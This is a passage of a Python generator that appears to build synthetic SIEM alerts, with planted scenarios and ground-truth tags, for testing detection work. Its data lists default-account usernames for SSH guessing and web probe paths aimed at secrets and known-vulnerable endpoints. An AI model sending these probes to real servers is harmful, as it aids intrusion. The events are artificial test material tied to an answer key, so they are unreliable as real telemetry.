    iso_after = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(state.mtime))
    full_log = (
        f"File '{path}' modified\nMode: realtime\nChanged attributes: size,mtime,md5,sha1,sha256\n"
        f"Size changed from '{before[0]}' to '{state.size}'\n"
        f"Old modification time was: '{before[4]}', now it is '{state.mtime}'\n"
        f"Old md5sum was: '{before[1]}'\nNew md5sum is : '{state.md5}'\n"
        f"Old sha1sum was: '{before[2]}'\nNew sha1sum is : '{state.sha1}'\n"
        f"Old sha256sum was: '{before[3]}'\nNew sha256sum is : '{state.sha256}'\n"
    )
    return {
        "full_log": full_log,
        "syscheck": {
            "path": path,
            "mode": "realtime",
            "size_before": str(before[0]),
            "size_after": str(state.size),
            "perm_after": "rw-r-----",
            "uid_after": "0" if owner == "root" else "1001",
            "gid_after": "0" if owner == "root" else "1001",
            "md5_before": before[1],
            "md5_after": state.md5,
            "sha1_before": before[2],
            "sha1_after": state.sha1,
            "sha256_before": before[3],
            "sha256_after": state.sha256,
            "uname_after": owner,
            "gname_after": owner,
            "mtime_before": iso_before,
            "mtime_after": iso_after,
            "inode_after": state.inode,
            "changed_attributes": ["size", "mtime", "md5", "sha1", "sha256"],
            "event": "modified",
        },
        "decoder": {"name": "syscheck_integrity_changed"},
        "location": "syscheck",
    }


def _sca(agent: _Agent, ms: int, rng: random.Random) -> tuple[dict[str, Any], str]:
    if agent.platform == "rhel":
        policy, policy_id = "CIS Red Hat Enterprise Linux 9 Benchmark v2.0.0", "cis_rhel9_linux"
    else:
        policy, policy_id = "CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0", "cis_ubuntu24-04"
    total = 190 + rng.randrange(0, 6)
    passed = 72 + rng.randrange(0, 8)
    invalid = rng.randrange(0, 4)
    failed = total - passed - invalid
    score = passed * 100 // (passed + failed)
    data = {
        "sca": {
            "type": "summary",
            "scan_id": str(rng.randrange(100_000_000, 2_000_000_000)),
            "name": policy,
            "file": f"{policy_id}.yml",
            "description": "Security configuration assessment of the operating system baseline.",
            "passed": str(passed),
            "failed": str(failed),
            "invalid": str(invalid),
            "total_checks": str(total),
            "score": str(score),
            "policy_id": policy_id,
        }
    }
    body = {"decoder": {"name": "sca"}, "data": data, "location": "sca"}
    return body, f"SCA summary: {policy}: Score less than 50% ({score})"


def _win_body(
    agent: _Agent,
    ms: int,
    rng: random.Random,
    *,
    provider: str,
    guid: str,
    event_id: str,
    channel: str,
    severity: str,
    keywords: str,
    task: str,
    version: str,
    level: str,
    message: str,
    eventdata: dict[str, str],
) -> dict[str, Any]:
    system = {
        "providerName": provider,
        "providerGuid": guid,
        "eventID": event_id,
        "version": version,
        "level": level,
        "task": task,
        "opcode": "0",
        "keywords": keywords,
        "systemTime": _win_time(ms - rng.randrange(150, 2500), rng),
        "eventRecordID": "0",  # assigned at write time, per agent and channel, in timestamp order
        "processID": str(rng.choice((4, 668, 700, 772, 804))),
        "threadID": str(rng.randrange(100, 9000)),
        "channel": channel,
        "computer": f"{agent.name}.{_DNS}",
        "severityValue": severity,
        "message": message,
    }
    return {
        "decoder": {"name": "windows_eventchannel"},
        "data": {"win": {"system": system, "eventdata": eventdata}},
        "location": "EventChannel",
    }


def _sid(rng: random.Random) -> str:
    return f"{_DOMAIN_SID}-{rng.randrange(1100, 9000)}"


def _logon_ok(
    agent: _Agent,
    ms: int,
    rng: random.Random,
    *,
    user: str,
    logon_type: str,
    ip: str = "-",
    subject: str = "-",
    process: str = "-",
    package: str = "Kerberos",
    logon_process: str = "Kerberos",
    workstation: str = "-",
) -> dict[str, Any]:
    local_subject = subject != "-"
    eventdata = {
        "subjectUserSid": "S-1-5-18" if local_subject else "S-1-0-0",
        "subjectUserName": subject,
        "subjectDomainName": _DOMAIN if local_subject else "-",
        "subjectLogonId": "0x3e7" if local_subject else "0x0",
        "targetUserSid": _sid(rng),
        "targetUserName": user,
        "targetDomainName": _DOMAIN,
        "targetLogonId": f"0x{rng.getrandbits(32):x}",
        "logonType": logon_type,
        "logonProcessName": logon_process,
        "authenticationPackageName": package,
        "workstationName": workstation,
        "logonGuid": _guid(rng),
        "keyLength": "0",
        "processId": f"0x{rng.randrange(0x200, 0x2000):x}" if process != "-" else "0x0",
        "processName": _winpath(process) if process != "-" else "-",
        "ipAddress": ip,
        "ipPort": str(rng.randrange(49152, 65535)) if ip != "-" else "-",
        "impersonationLevel": "%%1833",
        "virtualAccount": "%%1843",
        "elevatedToken": "%%1842",
    }
    return _win_body(
        agent,
        ms,
        rng,
        provider="Microsoft-Windows-Security-Auditing",
        guid=_SEC_GUID,
        event_id="4624",
        channel="Security",
        severity="AUDIT_SUCCESS",
        keywords="0x8020000000000000",
        task="12544",
        version="2",
        level="0",
        message='"An account was successfully logged on."',
        eventdata=eventdata,
    )


def _logon_failed(
    agent: _Agent, ms: int, rng: random.Random, *, user: str, ip: str, exists: bool, workstation: str = "-"
) -> dict[str, Any]:
    eventdata = {
        "subjectUserSid": "S-1-0-0",
        "subjectUserName": "-",
        "subjectDomainName": "-",
        "subjectLogonId": "0x0",
        "targetUserSid": "S-1-0-0",
        "targetUserName": user,
        "targetDomainName": _DOMAIN,
        "status": "0xc000006d",
        "failureReason": "%%2313",
        "subStatus": "0xc000006a" if exists else "0xc0000064",
        "logonType": "3",
        "logonProcessName": "NtLmSsp ",
        "authenticationPackageName": "NTLM",
        "workstationName": workstation,
        "transmittedServices": "-",
        "lmPackageName": "-",
        "keyLength": "0",
        "processId": "0x0",
        "processName": "-",
        "ipAddress": ip,
        "ipPort": str(rng.randrange(49152, 65535)),
    }
    return _win_body(
        agent,
        ms,
        rng,
        provider="Microsoft-Windows-Security-Auditing",
        guid=_SEC_GUID,
        event_id="4625",
        channel="Security",
        severity="AUDIT_FAILURE",
        keywords="0x8010000000000000",
        task="12544",
        version="0",
        level="0",
        message='"An account failed to log on."',
        eventdata=eventdata,
    )


_SYSTEM_BINARIES = (
    r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\System32\conhost.exe",
    r"C:\Windows\System32\taskhostw.exe",
    r"C:\Windows\System32\wermgr.exe",
    r"C:\Windows\System32\backgroundTaskHost.exe",
    r"C:\Windows\System32\RuntimeBroker.exe",
    r"C:\Windows\System32\dllhost.exe",
    r"C:\Windows\System32\sppsvc.exe",
)


def _process_created(
    agent: _Agent, ms: int, rng: random.Random, user: str, launch: _Launch | None = None
) -> dict[str, Any]:
    if launch is None:
        image = rng.choice(_SYSTEM_BINARIES)
        parent = (
            r"C:\Windows\System32\services.exe" if image.endswith("svchost.exe") else r"C:\Windows\System32\svchost.exe"
        )
        command = image
    else:
        image, command, parent = launch.image, launch.command, launch.parent
    eventdata = {
        "subjectUserSid": "S-1-5-18" if launch is None else _sid(rng),
        "subjectUserName": f"{agent.name.upper()}$" if launch is None else user,
        "subjectDomainName": _DOMAIN,
        "subjectLogonId": "0x3e7" if launch is None else f"0x{rng.getrandbits(32):x}",
        "newProcessId": f"0x{rng.randrange(0x400, 0x4000):x}",
        "newProcessName": _winpath(image),
        "tokenElevationType": "%%1936" if launch is None else "%%1938",
        "processId": f"0x{rng.randrange(0x200, 0x2000):x}",
        "commandLine": _winpath(command),
        "targetUserSid": "S-1-0-0",
        "targetUserName": user,
        "targetDomainName": "-",
        "targetLogonId": "0x0",
        "parentProcessName": _winpath(parent),
        "mandatoryLabel": "S-1-16-16384" if launch is None else "S-1-16-8192",
    }
    return _win_body(
        agent,
        ms,
        rng,
        provider="Microsoft-Windows-Security-Auditing",
        guid=_SEC_GUID,
        event_id="4688",
        channel="Security",
        severity="AUDIT_SUCCESS",
        keywords="0x8020000000000000",
        task="13312",
        version="2",
        level="0",
        message='"A new process has been created."',
        eventdata=eventdata,
    )


def _log_cleared(agent: _Agent, ms: int, rng: random.Random, user: str) -> dict[str, Any]:
    eventdata = {
        "subjectUserSid": _sid(rng),
        "subjectUserName": user,
        "subjectDomainName": _DOMAIN,
        "subjectLogonId": f"0x{rng.getrandbits(32):x}",
    }
    return _win_body(
        agent,
        ms,
        rng,
        provider="Microsoft-Windows-Eventlog",
        guid=_EVENTLOG_GUID,
        event_id="1102",
        channel="Security",
        severity="AUDIT_SUCCESS",
        keywords="0x4020000000000000",
        task="104",
        version="1",
        level="4",
        message='"The audit log was cleared."',
        eventdata=eventdata,
    )


def _service_start_changed(agent: _Agent, ms: int, rng: random.Random) -> dict[str, Any]:
    service = rng.choice(
        (
            ("Background Intelligent Transfer Service", "BITS"),
            ("Windows Modules Installer", "TrustedInstaller"),
            ("Windows Update", "wuauserv"),
        )
    )
    eventdata = {"param1": service[0], "param2": "demand start", "param3": "auto start", "param4": service[1]}
    return _win_body(
        agent,
        ms,
        rng,
        provider="Service Control Manager",
        guid=_SCM_GUID,
        event_id="7040",
        channel="System",
        severity="INFORMATION",
        keywords="0x8080000000000000",
        task="0",
        version="0",
        level="4",
        message=f'"The start type of the {service[0]} service was changed from demand start to auto start."',
        eventdata=eventdata,
    )


def _sysmon(
    agent: _Agent, ms: int, rng: random.Random, event_id: str, task: str, message: str, eventdata: dict[str, str]
) -> dict[str, Any]:
    return _win_body(
        agent,
        ms,
        rng,
        provider="Microsoft-Windows-Sysmon",
        guid=_SYSMON_GUID,
        event_id=event_id,
        channel=_SYSMON_CHANNEL,
        severity="INFORMATION",
        keywords="0x8000000000000000",
        task=task,
        version="5",
        level="4",
        message=message,
        eventdata=eventdata,
    )


class _Launch(NamedTuple):
    image: str
    command: str
    parent: str
    parent_command: str


def _script_started(
    agent: _Agent, ms: int, rng: random.Random, account: str, scheduled: bool, launch: _Launch | None = None
) -> dict[str, Any]:
    if launch is not None:
        image, command, parent, parent_cmd = launch
    elif scheduled:
        script = rng.choice(("collect-inventory.ps1", "rotate-logs.ps1", "check-disk.ps1"))
        image = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\" + script
        parent = r"C:\Windows\System32\svchost.exe"
        parent_cmd = r"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"
    else:
        image, command = r"C:\Windows\System32\cmd.exe", r'"C:\Windows\System32\cmd.exe" /c ipconfig /all'
        parent, parent_cmd = r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE"
    powershell = image.lower().endswith("powershell.exe")
    eventdata = {
        "ruleName": "-",
        "utcTime": _sysmon_time(ms - rng.randrange(100, 2000)),
        "processGuid": _guid(rng),
        "processId": str(rng.randrange(1000, 30000)),
        "image": _winpath(image),
        "fileVersion": f"10.0.{agent.os_version.split('.')[2]}.1 (WinBuild.160101.0800)",
        "description": "Windows PowerShell" if powershell else "Windows Command Processor",
        "product": "Microsoft® Windows® Operating System",
        "company": "Microsoft Corporation",
        "originalFileName": "PowerShell.EXE" if powershell else "Cmd.Exe",
        "commandLine": _winpath(command),
        "currentDirectory": _winpath("C:\\Windows\\system32\\"),
        "user": _winpath(account),
        "logonGuid": _guid(rng),
        "logonId": f"0x{rng.getrandbits(32):x}",
        "terminalSessionId": "0",
        "integrityLevel": "System" if scheduled else "Medium",
        "hashes": f"SHA256={_hex(rng, 32).upper()}",
        "parentProcessGuid": _guid(rng),
        "parentProcessId": str(rng.randrange(400, 5000)),
        "parentImage": _winpath(parent),
        "parentCommandLine": _winpath(parent_cmd),
        "parentUser": _winpath("NT AUTHORITY\\SYSTEM" if scheduled else account),
    }
    return _sysmon(agent, ms, rng, "1", "1", '"Process Create:"', eventdata)


def _net_connection(
    agent: _Agent, ms: int, rng: random.Random, account: str, image: str, dst: str, port: int
) -> dict[str, Any]:
    eventdata = {
        "ruleName": "-",
        "utcTime": _sysmon_time(ms - rng.randrange(100, 2000)),
        "processGuid": _guid(rng),
        "processId": str(rng.randrange(1000, 30000)),
        "image": _winpath(image),
        "user": _winpath(account),
        "protocol": "tcp",
        "initiated": "true",
        "sourceIsIpv6": "false",
        "sourceIp": agent.ip or "-",
        "sourceHostname": f"{agent.name}.{_DNS}",
        "sourcePort": str(rng.randrange(49152, 65535)),
        "sourcePortName": "-",
        "destinationIsIpv6": "false",
        "destinationIp": dst,
        "destinationHostname": "-",
        "destinationPort": str(port),
        "destinationPortName": "https" if port == 443 else "-",
    }
    return _sysmon(agent, ms, rng, "3", "3", '"Network connection detected:"', eventdata)


_AV_IMAGE = r"C:\Program Files\ExampleAV\avscan.exe"


def _lsass_access(agent: _Agent, ms: int, rng: random.Random) -> dict[str, Any]:
    eventdata = {
        "ruleName": "-",
        "utcTime": _sysmon_time(ms - rng.randrange(100, 2000)),
        "sourceProcessGUID": _guid(rng),
        "sourceProcessId": str(rng.randrange(1000, 9000)),
        "sourceThreadId": str(rng.randrange(1000, 9000)),
        "sourceImage": _winpath(_AV_IMAGE),
        "targetProcessGUID": _guid(rng),
        "targetProcessId": "700",
        "targetImage": _winpath(r"C:\Windows\system32\lsass.exe"),
        "grantedAccess": "0x1410",
        "callTrace": _winpath(
            r"C:\Windows\SYSTEM32\ntdll.dll+9d4c4|C:\Windows\System32\KERNELBASE.dll+2c13e|"
            r"C:\Program Files\ExampleAV\avcore.dll+1a2b3"
        ),
        "sourceUser": _winpath("NT AUTHORITY\\SYSTEM"),
        "targetUser": _winpath("NT AUTHORITY\\SYSTEM"),
    }
    return _sysmon(agent, ms, rng, "10", "10", '"Process accessed:"', eventdata)


# ---- streams ------------------------------------------------------------------------------------------------------
#
# Each stream owns one RNG and yields its alerts in timestamp order, hour by hour (bounded memory); the writer
# merges all streams with heapq.merge. Background rates are "events per hour" at shape 1.0, multiplied by
# ``scale``; planted scenarios never scale, so their structure (and the ground truth) does not depend on it.

_Raw = tuple[int, int, int, str, _Agent, dict[str, Any], tuple[str, ...], str | None]
# (epoch ms, stream index, stream sequence, rule id, agent, body, scenario tags, description override)

_INVALID_USERS = (
    "admin",
    "user",
    "ubuntu",
    "oracle",
    "postgres",
    "git",
    "ftpuser",
    "support",
    "guest",
    "pi",
    "deploy",
    "www",
    "hadoop",
    "jenkins",
    "mysql",
    "nagios",
    "ansible",
    "dev",
    "docker",
    "centos",
    "minecraft",
    "steam",
    "ubnt",
    "vagrant",
    "odoo",
    "es",
    "solr",
    "tomcat",
)
_SCANNER_USERS = (
    "oracle",
    "postgres",
    "ubnt",
    "pi",
    "user",
    "guest",
    "ftp",
    "nagios",
    "git",
    "hadoop",
    "default",
    "support",
    "operator",
    "vagrant",
    "cisco",
    "service",
    "root1",
    "sysadmin",
)
_SPRAY_EXTRA = (
    "administrator",
    "guest",
    "helpdesk",
    "reception",
    "scanner",
    "backup",
    "operator",
    "finance",
    "payroll",
    "sales",
    "marketing",
    "training",
    "kiosk",
    "printer",
    "hr",
    "it.support",
)
_WEB_PATHS = (
    "/wp-login.php",
    "/.env",
    "/phpmyadmin/",
    "/admin/config.php",
    "/robots.txt",
    "/.git/config",
    "/cgi-bin/luci",
    "/actuator/health",
    "/owa/",
    "/static/app.js.map",
    "/xmlrpc.php",
    "/server-status",
    "/api/v1/users/me",
    "/login?next=%2Fdashboard",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
)
# over-long URL checks of the vulnerability scanner (buffer-overflow probes): path prefix, padded at run time
_SCANNER_URLS = (
    "/index.php?page=",
    "/cgi-bin/test.cgi?q=",
    "/login?next=",
    "/api/v2/search?q=",
    "/static/",
)
_PROBE_PATHS = (
    "/api/v2/items?id=",
    "/api/v2/export?format=",
    "/api/v2/search?q=",
    "/api/v2/orders?page=",
    "/api/v2/reports/",
    "/api/v2/items/",
)
_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36",
    "curl/8.5.0",
    "python-requests/2.32.3",
    "Go-http-client/1.1",
    "Mozilla/5.0 zgrab/0.x",
)
_ETC_FILES = {
    "web": ("/etc/nginx/nginx.conf", "/etc/nginx/conf.d/app.conf", "/etc/hosts"),
    "db": ("/etc/hosts", "/etc/sysconfig/app", "/etc/security/limits.conf"),
    "legacy": ("/etc/hosts", "/etc/crontab"),
}
_APP_LOGS = ("/var/log/app/app.log", "/var/log/app/worker.log", "/var/log/app/api.log")
_UPDATERS = (
    r"C:\Users\{u}\AppData\Local\Programs\chatapp\chatapp.exe",
    r"C:\Users\{u}\AppData\Local\SyncClient\syncclient.exe",
    r"C:\Users\{u}\AppData\Roaming\notes-app\notes.exe",
)
_FW_PORTS = (
    (22, "tcp"),
    (23, "tcp"),
    (445, "tcp"),
    (3389, "tcp"),
    (8080, "tcp"),
    (5900, "tcp"),
    (1433, "tcp"),
    (3306, "tcp"),
    (25, "tcp"),
    (53, "udp"),
    (161, "udp"),
    (123, "udp"),
    (6379, "tcp"),
    (9200, "tcp"),
)


def _external_ip(rng: random.Random) -> str:
    while True:
        ip = f"{rng.choice(('192.0.2', '198.51.100', '203.0.113'))}.{rng.randrange(1, 255)}"
        if ip not in _RESERVED_IPS:
            return ip


class _Stream:
    def __init__(self, world: _World, name: str, *, stop_ms: int | None = None) -> None:
        self.w = world
        self.name = name
        self.rng = _stream_rng(world.seed, name)
        self.index = 0
        self.stop_ms = world.now_ms if stop_ms is None else min(stop_ms, world.now_ms)
        self._heap: list[_Raw] = []
        self._seq = 0
        self._days: dict[date, float] = {}

    def push(
        self,
        ms: int,
        rule_id: str,
        agent: _Agent,
        body: dict[str, Any],
        tags: tuple[str, ...] = (),
        description: str | None = None,
    ) -> None:
        if self.w.start_ms <= ms < self.stop_ms:
            heapq.heappush(self._heap, (ms, self.index, self._seq, rule_id, agent, body, tags, description))
            self._seq += 1

    def hour(self, h: int, t0: int) -> None:
        """Generate the events whose timestamps fall in [t0, t0 + 1h) (or shortly after)."""

    def events(self) -> Iterator[_Raw]:
        for h in range(self.w.hours):
            t0 = self.w.grid_ms + h * _HOUR_MS
            if t0 >= self.stop_ms:
                break
            self.hour(h, t0)
            limit = t0 + _HOUR_MS
            while self._heap and self._heap[0][0] < limit:
                yield heapq.heappop(self._heap)
        while self._heap:
            yield heapq.heappop(self._heap)

    def count(self, lam: float) -> int:
        """Overdispersed hourly count: Poisson with a gamma-distributed rate (negative binomial)."""
        if lam <= 0.0:
            return 0
        return _poisson(self.rng, lam * self.rng.gammavariate(4.0, 0.25))

    def day_factor(self, h: int) -> float:
        day = self.w.info[h].local_date
        factor = self._days.get(day)
        if factor is None:
            factor = self._days[day] = self.rng.gammavariate(8.0, 0.125)
        return factor

    def times(self, t0: int, n: int, t1: int | None = None) -> list[int]:
        end = t0 + _HOUR_MS if t1 is None else t1
        if n <= 0 or end <= t0:
            return []
        return sorted(self.rng.randrange(t0, end) for _ in range(n))


class _LinuxHost(_Stream):
    """cron/PAM, admin ssh + sudo, rare /etc FIM, the SCA heartbeat, and internet noise on the web servers."""

    def __init__(self, world: _World, agent: _Agent, *, stop_ms: int | None = None) -> None:
        super().__init__(world, f"linux:{agent.name}", stop_ms=stop_ms)
        self.agent = agent
        self.pid = self.rng.randrange(2000, 30000)
        self.sca_minute = self.rng.randrange(3, 50)
        self.files: dict[str, _FileState] = {}
        self.sca_stop = world.sca_stop_ms if agent.name == "srv-db-02" else None

    def hour(self, h: int, t0: int) -> None:
        w, rng, agent, scale = self.w, self.rng, self.agent, self.w.scale
        dayf = self.day_factor(h)
        cron = 2.0 if agent.role == "manager" else 4.0
        for ms in self.times(t0, self.count(cron * scale * dayf)):
            self.pid += rng.randrange(3, 40)
            self.push(ms, "5501", agent, _pam(agent, ms, rng, self.pid, True))
            close = ms + rng.randrange(400, 4000)
            body = _pam(agent, close, rng, self.pid, False)
            if close < w.pam_change_ms:  # scenario r: after the PAM update the close line no longer matches 5502
                self.push(close, "5502", agent, body, ("r",))
        if agent.role == "manager":
            return
        biz = w.business(h)
        for ms in self.times(t0, self.count(0.4 * scale * biz * dayf)):
            self.push(ms, "5715", agent, _sshd_accepted(agent, ms, rng, rng.choice(_ADMINS), BASTION_IP))
        for ms in self.times(t0, self.count(0.3 * scale * biz * dayf)):
            self.push(ms, "5402", agent, _sudo(agent, ms, rng, rng.choice(_ADMINS)))
        for ms in self.times(t0, self.count(0.02 * scale * biz)):
            path = rng.choice(_ETC_FILES.get(agent.role, _ETC_FILES["legacy"]))
            state = self.files.setdefault(path, _FileState(rng, ms))
            self.push(ms, "550", agent, _fim(path, ms, rng, state, "root"))
        if (t0 // _HOUR_MS) % 12 == 2:  # SCA scans at 02:xx and 14:xx UTC
            ms = t0 + self.sca_minute * 60_000 + rng.randrange(120_000)
            body, description = _sca(agent, ms, rng)
            if self.sca_stop is None or ms < self.sca_stop:
                tags = ("l",) if agent.name == "srv-db-02" else ()
                self.push(ms, "19004", agent, body, tags, description)
        if agent.role == "web":
            self._internet(h, t0, dayf)

    def _internet(self, h: int, t0: int, dayf: float) -> None:
        w, rng, agent, scale = self.w, self.rng, self.agent, self.w.scale
        for ms in self.times(t0, self.count(0.5 * scale * (0.6 + 0.4 * w.diurnal(h)))):
            ip = _external_ip(rng)
            for _ in range(rng.randint(1, 3)):
                self.push(ms, "5710", agent, _sshd_invalid(agent, ms, rng, rng.choice(_INVALID_USERS), ip))
                ms += rng.randrange(2000, 9000)
        for ms in self.times(t0, self.count(1.5 * scale * w.diurnal(h) * dayf)):
            if rng.random() < 0.7:
                ip, status = _external_ip(rng), rng.choice((404, 404, 404, 400, 403))
            else:
                ip, status = f"10.40.1.{rng.randrange(101, 121)}", rng.choice((404, 400))
            body = _web(
                agent, ms, ip, "GET", rng.choice(_WEB_PATHS), status, rng.randrange(150, 900), rng.choice(_USER_AGENTS)
            )
            self.push(ms, "31101", agent, body)


class _WindowsHost(_Stream):
    """Security logons / process creation, System, Sysmon; optional noisy LSASS-access rule (scenario h)."""

    def __init__(
        self,
        world: _World,
        agent: _Agent,
        *,
        logons: float,
        processes: bool = True,
        sysmon: float = 0.0,
        sysmon_stop_ms: int | None = None,
        lsass: float = 0.0,
        stop_ms: int | None = None,
    ) -> None:
        super().__init__(world, f"windows:{agent.name}", stop_ms=stop_ms)
        self.agent = agent
        self.logons = logons
        self.processes = processes
        self.sysmon = sysmon
        self.sysmon_stop_ms = sysmon_stop_ms
        self.lsass = lsass
        self.laptops = [a for a in world.fleet if a.role == "laptop"]
        self.dcs = [a for a in world.fleet if a.role == "dc"]

    def hour(self, h: int, t0: int) -> None:
        w, rng, agent, scale = self.w, self.rng, self.agent, self.w.scale
        dayf = self.day_factor(h)
        biz = w.business(h)
        is_dc = agent.role == "dc"
        shape = w.diurnal(h) if is_dc else 0.5 + 0.5 * biz
        for ms in self.times(t0, self.count(self.logons * scale * shape * dayf)):
            if is_dc:
                laptop = rng.choice(self.laptops)
                user = f"{laptop.name.upper()}$" if rng.random() < 0.35 else str(laptop.owner)
                body = _logon_ok(agent, ms, rng, user=user, logon_type="3", ip=laptop.ip or "-")
            elif rng.random() < 0.6:
                dc = rng.choice(self.dcs)
                body = _logon_ok(agent, ms, rng, user=f"{dc.name.upper()}$", logon_type="3", ip=dc.ip or "-")
            else:
                body = _logon_ok(
                    agent,
                    ms,
                    rng,
                    user=rng.choice(_ADMINS),
                    logon_type="10",
                    ip=BASTION_IP,
                    subject=f"{agent.name.upper()}$",
                    process=r"C:\Windows\System32\svchost.exe",
                    package="Negotiate",
                    logon_process="User32 ",
                    workstation="BASTION01",
                )
            self.push(ms, "60106", agent, body)
        if is_dc:
            for ms in self.times(t0, self.count(0.25 * scale * biz * dayf)):
                laptop = rng.choice(self.laptops)
                body = _logon_failed(
                    agent,
                    ms,
                    rng,
                    user=str(laptop.owner),
                    ip=laptop.ip or "-",
                    exists=True,
                    workstation=laptop.name.upper(),
                )
                self.push(ms, "60122", agent, body)
        if self.processes:
            for ms in self.times(t0, self.count(1.8 * scale * (0.6 + 0.4 * biz) * dayf)):
                self.push(ms, "67027", agent, _process_created(agent, ms, rng, "-"))
        if self.sysmon:
            for ms in self.times(t0, self.count(self.sysmon * scale * (0.7 + 0.3 * biz) * dayf)):
                if self.sysmon_stop_ms is None or ms < self.sysmon_stop_ms:
                    body = _script_started(agent, ms, rng, "NT AUTHORITY\\SYSTEM", scheduled=True)
                    self.push(ms, "92001", agent, body)
        if self.lsass:  # planted (scenario h): not scaled
            for ms in self.times(t0, self.count(self.lsass * (0.8 + 0.2 * biz))):
                self.push(ms, "92601", agent, _lsass_access(agent, ms, rng), ("h",))
        for ms in self.times(t0, self.count(0.03 * scale)):
            self.push(ms, "61104", agent, _service_start_changed(agent, ms, rng))


class _Laptop(_Stream):
    """Business-hours laptops: nothing at night, on weekends or on the holiday (scenario m)."""

    def __init__(self, world: _World, agent: _Agent) -> None:
        super().__init__(world, f"laptop:{agent.name}")
        self.agent = agent
        self.owner = str(agent.owner)
        self.account = f"{_DOMAIN}\\{self.owner}"

    def hour(self, h: int, t0: int) -> None:
        w, rng, agent, scale = self.w, self.rng, self.agent, self.w.scale
        plan = w.schedules.get(agent.name, {})
        for start, end in w.on_intervals(agent.name, t0, t0 + _HOUR_MS):
            frac = (end - start) / _HOUR_MS
            day_span = plan.get(w.info_at(start).local_date)
            if day_span and t0 <= day_span[0] < t0 + _HOUR_MS:  # power on: interactive logon
                ms = min(day_span[0] + rng.randrange(20_000, 90_000), day_span[1] - 1)
                body = _logon_ok(
                    agent,
                    ms,
                    rng,
                    user=self.owner,
                    logon_type="2",
                    subject=f"{agent.name.upper()}$",
                    process=r"C:\Windows\System32\svchost.exe",
                    package="Negotiate",
                    logon_process="User32 ",
                    workstation=agent.name.upper(),
                )
                self.push(ms, "60106", agent, body)
            for ms in self.times(start, self.count(0.8 * scale * frac), end):
                body = _logon_ok(
                    agent,
                    ms,
                    rng,
                    user=self.owner,
                    logon_type="7",
                    subject=f"{agent.name.upper()}$",
                    process=r"C:\Windows\System32\svchost.exe",
                    package="Negotiate",
                    logon_process="User32 ",
                    workstation=agent.name.upper(),
                )
                self.push(ms, "60106", agent, body)
            for ms in self.times(start, self.count(2.0 * scale * frac), end):
                self.push(ms, "67027", agent, _process_created(agent, ms, rng, self.owner))
            for ms in self.times(start, self.count(0.3 * scale * frac), end):
                self.push(ms, "92001", agent, _script_started(agent, ms, rng, self.account, scheduled=False))
            for ms in self.times(start, self.count(0.5 * scale * frac), end):
                image = rng.choice(_UPDATERS).replace("{u}", self.owner)
                dst = f"198.51.100.{rng.randrange(100, 161)}"
                self.push(ms, "92150", agent, _net_connection(agent, ms, rng, self.account, image, dst, 443))


class _Firewall(_Stream):
    """fw-edge-01 syslog through the manager (agent 000, predecoder.hostname); firmware upgrade drops dstport."""

    def __init__(self, world: _World) -> None:
        super().__init__(world, "syslog:fw-edge-01")
        self.dmz = [a.ip for a in world.fleet if a.role == "web" and a.ip]

    def hour(self, h: int, t0: int) -> None:
        w, rng = self.w, self.rng
        for ms in self.times(t0, self.count(45.0 * w.scale * (0.7 + 0.3 * w.diurnal(h)) * self.day_factor(h))):
            port, proto = rng.choice(_FW_PORTS)
            body = _firewall(ms, rng, _external_ip(rng), rng.choice(self.dmz), port, proto, ms >= w.fw_upgrade_ms)
            self.push(ms, "4101", w.manager, body, ("k",))


class _FimNoise(_Stream):
    """Scenario c: realtime FIM on constantly rotating application logs of a database server."""

    def __init__(self, world: _World, agent: _Agent) -> None:
        super().__init__(world, f"fim:{agent.name}")
        self.agent = agent
        self.files: dict[str, _FileState] = {}

    def hour(self, h: int, t0: int) -> None:
        for path in _APP_LOGS:
            for ms in self.times(t0, self.count(2.0)):
                state = self.files.setdefault(path, _FileState(self.rng, ms))
                self.push(ms, "550", self.agent, _fim(path, ms, self.rng, state, "appsvc"), ("c",))


class _Planned(_Stream):
    """A stream whose timeline is planned up front (``plan``: sorted (ms, item)) and materialized hour by hour."""

    def __init__(self, world: _World, name: str) -> None:
        super().__init__(world, name)
        self.plan: list[tuple[int, Any]] = []
        self._next = 0

    def hour(self, h: int, t0: int) -> None:
        limit = t0 + _HOUR_MS
        while self._next < len(self.plan) and self.plan[self._next][0] < limit:
            ms, item = self.plan[self._next]
            self._next += 1
            self.make(ms, item)

    def make(self, ms: int, item: Any) -> None:
        raise NotImplementedError

    def local_ms(self, day: date, hour: int, minute: int) -> int:
        return _ms(datetime(day.year, day.month, day.day, hour, minute, tzinfo=self.w.tz).astimezone(UTC))

    def local_days(self) -> list[date]:
        return sorted({i.local_date for i in self.w.info})


class _BackupJob(_Planned):
    """Scenario a: svc_backup batch logons on srv-backup-01 every night, 00:30-04:30 local."""

    def __init__(self, world: _World) -> None:
        super().__init__(world, "planted:backup")
        self.agent = world.by_name["srv-backup-01"]
        for day in self.local_days():
            ms = self.local_ms(day, 0, 30) + self.rng.randrange(600_000)
            end = self.local_ms(day, 4, 30)
            while ms < end:
                self.plan.append((ms, None))
                ms += self.rng.randrange(55_000, 125_000)

    def make(self, ms: int, item: Any) -> None:
        body = _logon_ok(
            self.agent,
            ms,
            self.rng,
            user="svc_backup",
            logon_type="4",
            subject="SRV-BACKUP-01$",
            process=r"C:\Windows\System32\svchost.exe",
            package="Negotiate",
            logon_process="Advapi  ",
        )
        self.push(ms, "60106", self.agent, body, ("a",))


class _Scanner(_Planned):
    """Scenarios b and u: the trusted internal scanner checks every web server nightly.

    b: default accounts over ssh (5710). Attempts are >= 20 s apart, so the 5712 frequency rule (8 in 120 s) never
    fires for the scanner. u: over-long URLs against the web application (31115, level 7, no correlation rule
    depends on it); the servers answer 414, so no web attack ever "succeeds" (31106).
    """

    def __init__(self, world: _World) -> None:
        super().__init__(world, "planted:scanner")
        webs = [a for a in world.fleet if a.role == "web"]
        for day in self.local_days():
            ms = self.local_ms(day, 2, 0) + self.rng.randrange(300_000)
            for web in webs:
                for i in range(self.rng.randint(28, 42)):
